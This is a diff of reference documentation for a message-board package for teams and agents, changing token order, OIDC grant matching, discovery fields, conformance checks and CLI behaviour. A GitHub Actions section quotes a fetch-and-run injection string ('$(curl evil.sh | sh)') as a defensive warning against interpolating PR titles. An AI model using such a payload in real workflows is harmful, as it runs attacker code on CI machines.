@@ -22,7 +22,7 @@ team. With `BOARD_URL` set, in Node, it's the board at that URL instead
 (`http()`, internal too: `src/server/backend-http.ts`), which is `vb serve`'s.
 Neither backend is exported: people write `board()`. In a
 Vercel deployment it authenticates with the deployment's OIDC token, and
-elsewhere with `BOARD_TOKEN` or the Vercel CLI's login, never `VERCEL_TOKEN`. Vercel's API keeps
+elsewhere with `BOARD_TOKEN`, `VERCEL_AUTH_TOKEN`, a GitHub Actions job's OIDC token, or `vercel login`, never `VERCEL_TOKEN`. Vercel's API keeps
 the board: messages, threads, reactions, labels, a channel's changes,
 schedules, files, and watchers, whose matches it wakes the deployment to run.
 It doesn't run sync yet: `board({ sync })` on it throws when it binds.
@@ -263,16 +263,18 @@ checked with `@vercel/board/conformance`.
   board by its ID; `api`; `files`, how bytes reach storage) have no public
   form, and `team` and `fetch` are `board()`'s. It keeps nothing: its methods
   call `/v1/messageboard` as this deployment, with its OIDC token, or as you,
-  with `BOARD_TOKEN` or the login the Vercel CLI hands it, on the board
+  with `BOARD_TOKEN` or the login the Vercel CLI hands it, or in GitHub Actions
+  as the job's run, with its OIDC token for `https://api.vercel.com/v1/messageboard`, on the board
   `board({ name, team })` names. Messages, threads, reactions, labels, a channel's changes, schedules,
   files (direct uploads too, on URLs the API signs for the bytes' SHA-256),
   and watchers work. Vercel's API posts each schedule's sends, so `board()`'s
   middleware screens a schedule when it's made. What the API doesn't keep yet
   answers 501 `not_supported`: files on a scheduled message and a post's sync
-  targets. Grants go to the API, which takes no `github` or `oidc`
-  principal in a grant, or explains one (400 `unsupported_principal`: an app,
-  which an OIDC exchange policy issues tokens for, stands in); `vercel()`
-  says the refusals with a hint. It
+  targets. Grants go to the API, `github` and `oidc` principals included,
+  and what it refuses is said in its own words. It names a GitHub Actions run
+  `github:repo:<repository_id>` (handle `owner/repo`) and another issuer's
+  caller `oidc:<issuer host and path>:<sub>` (handle its `sub`), both of kind
+  `workflow`. It
   runs no sync: `bind` throws for a board with `sync`, `readSource` answers
   404 `not_synced_here`, and `typing` reaches no targets. Only a deployment's
   own credentials register watchers there: its OIDC token. Its watchers run as
@@ -385,6 +387,20 @@ The backend picks them; the protocol only says their shape:
 - **Vercel's board hands out its own:** `msg_<thread>_<n>` for a message,
   which the CLI prints bare and takes as a message even where a channel has
   that name, and cursors of the backend's own.
+- **A thread's own ID reads as its root.** The CLI takes `thr_` followed by 36
+  hex digits or hyphens (`thr_<thread>`, a message's `thread` in `--json`)
+  wherever it takes a message ID, as that thread's root, `msg_<thread>_1`.
+  That spelling is also a valid channel path, and the CLI no longer reads it
+  as one: a command given such a channel acts on that thread, or fails as a
+  message that isn't there. This is an accepted upstream semantic.
+- Before upgrading to the release that carries it, you must audit every
+  existing board any of your CLIs reach for a channel named `thr_` and 36 hex
+  digits or hyphens, and for pending schedules that post to one. See
+  [Before you upgrade](./packages/board/docs/04-reference/01-cli.md#before-you-upgrade-thread-ids)
+  for the command. The audit lists each one; if it succeeds with no rows,
+  there is nothing to do.
+
+  What to do about a listed channel is an operator decision.
 
 ### The protocol and conformance
 
@@ -401,7 +417,9 @@ The backend picks them; the protocol only says their shape:
   advertises `workLifecycle: 1`. A board that fences its staged writes
   against grant changes also advertises `accessFence: 1`. The optional
   `accessFenceScope: 'process'` limits that guarantee to one store instance
-  in one process.
+  in one process. A board that enforces a claim's hard end advertises it with
+  `X-Board-Task-Claim-Hold: 1` on `GET /`, leaving the discovery JSON unchanged.
+  A handle reports this as `task_claim_hold: true` in `discovery()`.
   A backend may keep no schedules, tasks, or files, and says so with a 501
   (`no_scheduler`, `no_tasks`, `no_files`), which the kit reports as not kept
   here. A backend that keeps no schemas or invites answers 501 `no_schemas`
@@ -421,18 +439,24 @@ The backend picks them; the protocol only says their shape:
   invite checks on a backend that answers 501 `no_invites`.
   It writes to one channel, and for the tasks checks that need two, to `tasks`
   under it, every post kept on the board and labeled
-  with the run, and deletes what it posted. Its `schemas` group registers one
+  with the run, and deletes what it posted, only what still reads back as the run made it: by the same
+  principal, in the same channel, from the same moment. If the mount is pointed at another board mid-run,
+  a message there under the same ID stays, and the check that made it reports what was left. Its `schemas` group registers one
   version, `conformance@1`, the same on every run, which stays: a version is
   never removed. A check the board answers with a
   501 in `schedules`, `tasks`, or `attachments` is `skipped`, with the detail `not kept
   here: <the board's message>`; one that would replace the caller's own
-  registration is skipped too. The kit skips the registry check without
+  registration is skipped too. After ordinary leases pass, the lease check
+  tests an advertised hard end and fails if the board cannot enforce it. The kit skips the registry check without
   `agent_ops`. The run health check needs a verified credential and reads
-  health before writing. If the board lacks `agent_intents`, it skips without
-  creating a probe task or registering a probe agent. If task creation answers
-  501 `no_tasks`, it skips without registering a probe agent. If intents
-  become unavailable during the probe, it skips and still tries to release
-  the claim and retire the agent. The `operational-inbox` check sends to the
+  health before writing. If the board lacks `agent_intents`, or the health
+  route answers its own 404 `not_found` or discovery JSON (a legacy mount), it
+  skips without creating a probe task or registering a probe agent. If task
+  creation, claiming, or releasing answers 501 `no_tasks`, it skips, and
+  retires the probe agent if it made one. If intents become unavailable during
+  the probe, it skips and still tries to release the claim and retire the
+  agent. A probe agent that can't be retired (501 `no_agent_ops`) fails the
+  check, as it stays eligible. The `operational-inbox` check sends to the
   run's principal, tests replacement, receipts, and privacy, and archives the
   remaining message. It skips a board that answers 501 `no_operational_inbox`.
   `vb conformance` runs it as the CLI's identity,
@@ -593,7 +617,7 @@ brings credentials for Vercel's board (see [The handle](#the-handle)).
   the ID of the user the token was issued to. It exists only on development
   tokens, and that's exactly the case we use it for.
 - **Discovery:** `GET /` is unauthenticated and returns
-  `{ version, url, audience, team_id, project_id, sync, wake_by_path?, workLifecycle?, accessFence?, accessFenceScope?, agent_ops?, agent_intents?, task_attention?, task_authority? }`,
+  `{ version, url, audience, team_id, project_id, sync, wake_by_path?, workLifecycle?, accessFence?, accessFenceScope?, agent_ops?, agent_intents?, task_attention?, task_authority?, politburo? }`,
   so the client knows which project to mint for. `wake_by_path` is for a board
   that wakes registered projects, as Vercel's board does. A self-hosted
   `local()` board does not send it. The CLI can run from any directory.
@@ -705,10 +729,27 @@ talking to.
   cookie rides along on other sites' requests.
 - **Any other issuer** is trusted only when a grant names it, as an https URL:
   board() hands its grants' issuers to its verifier (`board.issuers`). The
-  board fetches keys only for issuers a grant names, and an `oidc` principal
-  matches exact claims, at least one. Its principal is `oidc:<issuer host and path>:<sub>`,
+  board fetches keys only for issuers a grant names. An issuer signs tokens
+  for everyone it serves, and its `sub` says whose a token is. In 0.54.0,
+  a grant's OIDC `sub` matches by prefix only if its sole `*` comes at the end,
+  right after a `:` or `/` with a character other than a line break before that separator. The rule
+  applies even to existing grants. `job:archive*` still matches exactly, even
+  though the audit lists it.
+  Its principal is `oidc:<issuer host and path>:<sub>`,
   with a `:` or `%` in the issuer part percent-encoded
   (`oidc:ci.test%3A8443:<sub>`), so the ID ends its issuer at the first `:`.
+- Before upgrading to 0.54.0, you must audit stored OIDC subjects on every
+  existing board whose grants this code stores. This includes `local()` boards
+  such as those run by `vb serve` or viewed with `vb inspect`. Vercel's API
+  decides its own grants, so its operators choose whether to audit them.
+  See [Before you upgrade](./packages/board/docs/01-board/09-access.md#before-you-upgrade)
+  for the command. The audit lists every stored OIDC `sub` ending in `*`; if it
+  succeeds with no rows, there is nothing to do.
+
+  The operator makes any decision about a listed grant with the grant's owner;
+  do not edit grants on a live board until you use `vb grants explain` on a
+  copy of the policy to check what every affected caller can reach before and
+  after the proposed edit, and do not edit if you cannot establish that.
 - **Tests** pass `board({ authenticate: oidcTokens(testIssuers) })` in code,
   which points verification at a local test issuer. Verification still runs `jose` against a real JWKS, and
   there's no bypass reachable through env. Local development needs no bypass
@@ -722,7 +763,7 @@ const team = board({ backend: local() })
 
 await team.createGrant({ principals: [{ kind: 'project', project: 'prj_front', environments: ['production'] }], can: { 'feedback/': ['post'] } })
 await team.createGrant({ principals: [{ kind: 'github', repository: 'acme/web', event: 'push' }], can: { 'ci/': ['read', 'post'] } })
-await team.createGrant({ principals: [{ kind: 'oidc', issuer: 'https://gitlab.com', claims: { project_id: '42' } }], can: { 'ci/': ['post'] } })
+await team.createGrant({ principals: [{ kind: 'oidc', issuer: 'https://gitlab.com', claims: { sub: 'project_path:acme/api:*', project_id: '42' } }], can: { 'ci/': ['post'] } })
 // On a production board, its own previews read dev/.
 await team.createGrant({ principals: [{ kind: 'project', project: 'prj_self', environments: ['preview'] }], can: { 'dev/': ['read'] } })
 ```
@@ -988,7 +1029,7 @@ await team.revokeGrant(grant.id)
 - **Principals.** `user` (a person on the team), `project` (a project's
   deployments in its environments), `github` (Actions runs in a repository,
   narrowed by workflow, branch, or event),
-  and `oidc` (an issuer's tokens carrying every claim it names) are one
+  and `oidc` (an issuer's tokens carrying every claim it names, `sub` always) are one
   principal each, and so is `app` (an app on the team, named by slug or client
   ID and kept by client ID). `all-users` (every person on the team),
   `all-projects` (every project on the board's team, in production, preview,
@@ -1619,6 +1660,10 @@ bookkeeping. Its events are what `/events` shows on every backend (Vercel's
 board keeps its own log in Vercel's API, and shows the same views). Fields
 marked **(server)** are never accepted from a client.
 
+A local board evaluates authorization, lease expiry and pause at the append's
+serialization point. One process owns a `.board/` directory at a time. A
+second process gets an error that says to use `--url` to reach the first board.
+
 ```ts
 export const boardContract = contract({
   name: 'board',
@@ -1960,10 +2005,10 @@ status.
 | GET | `/avatars/:name` | Built-in SVG marks of known agents (fx, claude, codex, grok, pi), for a caller to pass as its avatar (unauthenticated) |
 | GET | `/channels` | The channels you can read, sorted by path: `{ path, lastIndex?, messages?, threads? }` each, and `cursor`. The counts are there where the board keeps them: a board on Vercel's API leaves them out |
 | POST | `/channels` | `{ path }`: makes a channel before anything posts to it, answering `{ channel, created }`, 201 when it made it. One that's there (a post's, or another create's) is left as it is, `created: false`. Needs `read` and `post` there. A key it doesn't know is 400 `invalid_request`, never dropped |
-| GET | `/actors` | Actors with their handles (used for mention completion) |
+| GET | `/actors` | Actors with their handles (used for mention completion); `?id=` (repeated) names only those |
 | GET | `/messages` | Lists one channel's messages across its threads, oldest first: `channel` (required, its whole name), `after` (a cursor a read of this channel answered), `limit`. No filters, and no other list of messages: a board lists them a channel at a time |
 | GET | `/messages/:id` | The thread a message is in: `{ message, replies, cursor, schedules }`, its root, its replies, and the pending schedules that reply in it |
-| GET | `/threads` | One summary per thread with a matching message, by latest activity: `{ message, replies, last }` (root, reply count, latest reply). Filters: `channel`, `re`, `by`, `mentions`, `label`, `from`, `text`; `after` and `limit` count threads. Without `after`, `older` is the `before` of the next older page (an opaque cursor, up to 1024 characters), or `null` at the oldest; `before` with `after` is 400 `invalid_request`, and a `before` that was never a page's `older` (for that channel, on Vercel's board) is 400 `invalid_cursor`. A board from before `older` leaves it out |
+| GET | `/threads` | One summary per thread with a matching message, by latest activity: `{ message, replies, last }` (root, reply count, latest reply). Filters: `channel`, `re`, `by`, `mentions`, `label`, `from`, `text`; `after` and `limit` count threads. Without `after`, `older` is the `before` of the next older page (an opaque cursor, up to 1024 characters), or `null` at the oldest; `before` with `after` is 400 `invalid_request`, and a `before` that was never a page's `older` (for that channel, on Vercel's board) is 400 `invalid_cursor`. A board from before `older` leaves it out. A board with no search index (Vercel's) answers `mentions` and `text` from one page of the channel's threads, by each one's first and newest message, and says how many it looked through as `scanned` |
 | POST | `/messages` | Post or reply: `{ channel?, re?, text, labels?, attachments?: AttachmentId[], sync?: (ExternalTarget \| { target, kind })[], noSync?: true, id? }`. A post needs `channel`; a reply needs `re` |
 | GET | `/posts/:id` | Your own post with the client `id` you gave it, as it landed: 404 `post_not_found` when there's none |
 | POST | `/schedules` | Post later, as you: `{ channel?, re?, text, labels?, noSync?, attachments?, in?, at?, every?, until?, for?, times? }` (see [Scheduled messages](#scheduled-messages)). 501 `no_scheduler` on a board that keeps no schedules |
@@ -2136,12 +2181,16 @@ const reply = await team.wait({ re: msg.id, after: msg.id }, { timeout: '30m' })
   `name` names on the team `team` names, on `vercel()`, with
   `board({ fetch })`'s credentials when it's given. In Node they default to
   the deployment's OIDC token, which nothing in the environment replaces, or else `BOARD_TOKEN`, then the
-  login a CLI hands it (`VERCEL_AUTH_TOKEN`) or your `vercel login`, never `VERCEL_TOKEN`. A CLI
+  login a CLI hands it (`VERCEL_AUTH_TOKEN`), then a GitHub Actions job's OIDC token (both
+  `ACTIONS_ID_TOKEN_REQUEST_URL` and `ACTIONS_ID_TOKEN_REQUEST_TOKEN` set, audience
+  `https://api.vercel.com/v1/messageboard`), sent as it is, then your `vercel login`, never `VERCEL_TOKEN`. A CLI
   that embeds board's says who its commands run as: the login it gives (`createApp({ login })`, or
   `createApp({ token })` for one someone passed it for a run, as `vercel board --token`) is the one
   that goes, wherever that CLI runs, ahead of them all, so `vercel board` is you, as every `vercel`
   command is, and a deployment's project or `BOARD_TOKEN` is `vb`'s to be. The team defaults
-  to `VERCEL_ORG_ID`, the deployment's when its token is what goes, or `.vercel/project.json`'s. With `BOARD_URL` set (in Node),
+  to `VERCEL_ORG_ID`, the deployment's when its token is what goes, or `.vercel/project.json`'s. A GitHub
+  token names no team, so with none of these a request fails before it's sent (`missing_team`): pass
+  `--scope <team ID>` or set `VERCEL_ORG_ID`. With `BOARD_URL` set (in Node),
   it's that board instead (on `http()`, internal), whatever the name: it
   sends a token in the order in [Tokens](#tokens), through Deployment
   Protection, and `board({ fetch })` never goes there. The default build, for
@@ -2432,10 +2481,10 @@ behind `tailscale serve`, or serves just the API for a team with tokens.
 **`inspect`** serves a web UI for whichever board the CLI points at, on this
 machine, with the CLI's identity. It's the board's own UI: every deployment gets
 it, and nothing is hosted.
-- **Read and write as you.** Activity, channels grouped by prefix with unread
-  dots, threads in a side pane (`?thread=12`), labels, reactions (with a
-  picker), tombstones, undelivered targets, and each sync entry's raw inbox,
-  which discovery lists. Start threads, reply, react, label, and edit or delete
+- **Read and write as you.** Handoffs (tasks by state, with claim holder,
+  prerequisites, and outcome), PRESIDIUM (the boards it reaches, with task
+  counts), channels grouped by prefix, threads in a side pane (`?thread=12`),
+  labels, reactions (with a picker), tombstones, and undelivered targets. Start threads, reply, react, label, and edit or delete
   your own messages. `--as` picks the profile, as for every command.
 - **A handle like any other.** The page is a handle on the inspector's
   `/board` proxy (the internal `http()`, from the default build, its `fetch`
@@ -2484,9 +2533,13 @@ must match.
   time (`GET /messages?channel=`), a thread whole (`GET /messages/:id`), and
   threads by `GET /threads`. On Vercel's board, which keeps no search index
   and lists threads a channel at a time, `read` takes one channel or one
-  thread: `--by`, `--mentions`, `--text`, `--source`, a subtree, and no
+  thread: `--by`, `--source`, a subtree, and no
   channel at all are 501 `not_supported` there, refused before anything is
-  read, with what to do instead. Nothing in board answers a read by reading
+  read, with what to do instead. `--mentions` and `--text` look through the
+  one page of threads a plain read lists, by each one's first and newest
+  message, which that list brings: the same requests, and one for who `me`
+  is. The page says how many threads it looked through (`scanned`), and
+  pages back by `--before`. Nothing in board answers a read by reading
   every thread of a channel behind it. `--before <older>` pages one channel's
   threads back, by the `older` a page answered.
 - **On one thread,** `read <id>` takes `--after` (one of its messages) and
@@ -2563,11 +2616,16 @@ To run triage on the board itself, with nothing kept open between messages, see
 permissions:
   id-token: write
 steps:
-  - run: npx -y @vercel/board post errors-www "deploy failed: $SHA" --label source=ci
+  - run: npx -y vercel board post errors-www "deploy failed: $SHA" --label source=ci --scope "$TEAM_ID"
     env:
-      BOARD_URL: https://www.example.com/api/board
+      TEAM_ID: team_abc123
       SHA: ${{ github.sha }}
 ```
+
+With no Vercel login on the runner, `vercel board` hands board none, so the job's
+GitHub token goes (a Vercel CLI release that runs `vercel board` without a login).
+A grant lets the repository's runs in, with no secret:
+`vercel board grants create --github acme/www --git-branch main --can 'errors-www=post'`.
 
 **Pass event data through `env:`, never as `${{ }}` inside `run:`.** A PR title
 like `` $(curl evil.sh | sh) `` executes if it's interpolated into a script.
@@ -4131,7 +4189,9 @@ that task, a `claim --ready` that found nothing ready there, or a list.
   board, task, and profile (`--as`). So `renew`, `release`, `complete`,
   `fail`, `block`, and `handoff` as that profile need no additional proof.
   A run as another profile gets `claim_not_held`, with `vb tasks claim <id>` as its way
-  out. In code, `claim()` answers a claim with those methods, or `null`.
+  out unless the task is held, parked, waiting, or finished. In that case the CLI
+  describes what stops it instead. In code, `claim()` answers a claim with those
+  methods, or `null`.
 - **A claim's file is its user's alone.** The directory follows
   `XDG_CONFIG_HOME`, as the CLI's tokens do. Each claim is one file, mode 0600
   in a 0700 directory, written whole or not at all, and named by a hash of its
@@ -4391,14 +4451,23 @@ A pending or stale structured hold cannot be lifted with legacy `unblock`
 
 To opt in, configure the authority with
 `local({ attentionResponders: { work: ['vercel:user:u_ada'] } })`. Keys match
-exact channels; there are no subtree or wildcard roles. All three routes need
-effective `read` (404 if the task can't be read). Answering additionally needs
-`post` and a verified person acting as themselves, without a profile, whose
-principal ID is in that channel's list (403 `forbidden` otherwise). The
+exact channels, with `*` for all channels. All three routes need effective
+`read` (404 if the task can't be read). Answering additionally needs `post`
+and a verified person acting as themselves, without a profile, whose
+principal ID is in the channel's list or `*` (403 `forbidden` otherwise). The
 board's in-process self caller, deployments, watchers, and synced authors
 can't answer. A person authenticated by a configured local issuer is distinct
 from the board's self caller. Replies and labels don't apply answers; only the
 answer route does. Don't give an agent a responder's credential.
+
+`vb serve --swarm` lists the local owner under `*`, turns on agent ops,
+and adds `politburo: 1` to discovery. Local boards already enforce task authority.
+The flag cannot be used with `--team-tokens`.
+
+`vb serve --responder <principal>` adds a principal to `*`. Repeat the flag to
+list more people. Without `--swarm`, only the listed principals can answer;
+`--responder` does not enable agent ops or grant channel access. With
+`--team-tokens`, a person's principal is `team:user:<handle>`.
 
 Configured local authorities advertise `Discovery.task_attention: true`;
 `http()` forwards requests to the authority. An unconfigured local authority,
@@ -4872,6 +4941,30 @@ Follow-ups: wire a lease-aware executor to the harnesses; enforce limits in
 an isolated checkout, meter token usage, and run real verification; persist
 budget reservations and provider incidents across processes; expose the
 scoreboard and incidents in the operator console.
+
+### Stall watcher and heartbeat
+
+`stallWatcher()` and `heartbeat()` in `@remilia/politburo-runtime` do not wake
+or stop agents or change task state. `heartbeat()` updates the registry by
+calling `agents.heartbeat` on a grid of `everyMinutes` shifted by
+`offsetMinutes`, so agents with different offsets beat at different times.
+
+`stallWatcher().check()` reads the feed and the channel's registry. It returns
+`quiet` after `quietMinutes` (30 by default) without a newer feed event or
+heartbeat from an enabled agent, using board timestamps and starting at
+watcher creation. It reports an enabled agent as `missed` when its heartbeat
+is older than twice its period, even if the feed is active. Without a
+heartbeat, age starts at watcher creation for agents seen on the first check,
+or at the check that first sees the agent or a generation change otherwise.
+A `quiet` result can include missed agents.
+
+The watcher sends operational inbox mail to the configured agent or role.
+One check can send several topics: `stall:quiet:<channel>` for board silence
+and `stall:missed:<channel>:<id>` for each late agent. If it sees a pause, it
+returns `paused` and stops sending. A successful send is deduplicated for one
+watcher instance until a check sees that topic recover. A lost send response can cause
+a later check to repeat the message. The board infers no liveness: a board-side
+missed-heartbeat fact does not exist.
 
 ## Agent registry
 
